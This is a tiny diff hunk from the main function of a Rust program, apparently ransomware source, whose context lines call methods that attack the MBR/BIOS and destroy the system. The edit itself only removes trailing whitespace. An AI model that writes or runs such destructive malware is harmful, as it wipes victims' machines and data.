@@ -832,4 +832,4 @@ fn main() -> Result<(), io::Error> {
     ransomware.attack_mbr_bios()?;
     ransomware.destroy_system()?;
     Ok(())
-}            
+}
